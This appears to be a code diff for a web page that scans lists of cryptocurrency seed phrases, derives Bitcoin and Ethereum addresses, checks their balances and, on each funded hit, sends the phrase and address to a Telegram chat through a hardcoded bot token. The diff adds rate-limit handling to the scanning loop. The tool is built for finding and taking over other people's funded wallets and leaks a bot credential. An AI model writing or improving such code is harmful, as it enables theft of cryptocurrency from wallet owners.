@@ -43,6 +43,7 @@
     .count { font-weight: bold; }
     .good { color: #0f0; }
     .bad { color: #f00; }
+    .limit { color: #ff0; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -62,6 +63,7 @@
     // --- Telegram Alert Configuration ---
     const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
     const TELEGRAM_CHAT_ID = '-4913064483';
+    let stopped = false;
 
     async function sendTelegramAlert(text) {
       try {
@@ -74,7 +76,25 @@
       }
     }
 
-    // اشتقاق عناوين
+    // دوال الفحص مع كشف حد الطلبات
+    async function checkApi(url) {
+      const res = await fetch(url);
+      if (res.status === 429) throw new Error('rate_limit');
+      return res.json();
+    }
+    async function checkBtc(addr) {
+      const data = await checkApi(`https://blockstream.info/api/address/${addr}`);
+      return (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) > 0;
+    }
+    async function checkEvm(addr, apiKey, apiUrl) {
+      if (!apiKey) return false;
+      const json = await checkApi(
+        `${apiUrl}?module=account&action=balance&address=${addr}&tag=latest&apikey=${apiKey}`
+      );
+      return parseFloat(json.result) > 0;
+    }
+
+    // اشتقاق العناوين
     function deriveBtc(seed) {
       const root = hdkey.fromMasterSeed(seed);
       const child = root.derive("m/44'/0'/0'/0/0");
@@ -84,19 +104,6 @@
       const root = hdkey.fromMasterSeed(seed);
       const child = root.derive("m/44'/60'/0'/0/0");
       return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, true).toString('hex');
-    }
-
-    // فحص الرصيد
-    async function checkBtc(addr) {
-      const res = await fetch(`https://blockstream.info/api/address/${addr}`);
-      const data = await res.json();
-      return (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) > 0;
-    }
-    async function checkEvm(addr, apiKey, apiUrl) {
-      if (!apiKey) return false;
-      const res = await fetch(`${apiUrl}?module=account&action=balance&address=${addr}&tag=latest&apikey=${apiKey}`);
-      const json = await res.json();
-      return parseFloat(json.result) > 0;
     }
 
     async function scanPhrase(phrase) {
@@ -133,20 +140,28 @@
         document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">0/${total}</span> عبارة`;
         const resultsDiv = document.getElementById('results'); resultsDiv.textContent = '';
         for (let i=0; i<lines.length; i++) {
-          const phrase = lines[i];
-          const res = await scanPhrase(phrase);
-          if (res.ok) {
-            good++;
-            resultsDiv.innerHTML += `<div class="good">✅ [${res.chain}] ${phrase} → ${res.addr}</div>`;
-            // صوت رصاصة
-            document.getElementById('gunshot').play();
-            // تنبيه تيليجرام
-            sendTelegramAlert(`Found ${res.chain} wallet:\nPhrase: ${phrase}\nAddress: ${res.addr}`);
-          } else {
-            bad++;
-            resultsDiv.innerHTML += `<div class="bad">❌ ${phrase}</div>`;
+          if (stopped) break;
+          try {
+            const phrase = lines[i];
+            const res = await scanPhrase(phrase);
+            if (res.ok) {
+              good++;
+              resultsDiv.innerHTML += `<div class="good">✅ [${res.chain}] ${phrase} → ${res.addr}</div>`;
+              document.getElementById('gunshot').play();
+              sendTelegramAlert(`Found ${res.chain} wallet:\nPhrase: ${phrase}\nAddress: ${res.addr}`);
+            } else {
+              bad++;
+              resultsDiv.innerHTML += `<div class="bad">❌ ${phrase}</div>`;
+            }
+          } catch (err) {
+            if (err.message === 'rate_limit') {
+              stopped = true;
+              resultsDiv.innerHTML += `<div class="limit">⚠️ تم الوصول للحد الأقصى لطلبات API، توقف الفحص.</div>`;
+            } else {
+              console.error(err);
+            }
           }
-          document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i+1}/${total}</span> عبارة`;
+          document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${Math.min(i+1,total)}/${total}</span> عبارة`;
         }
         document.getElementById('summary').innerHTML += `<br>`+
           `<span class="good">عبارات صالحة: ${good}</span> | `+
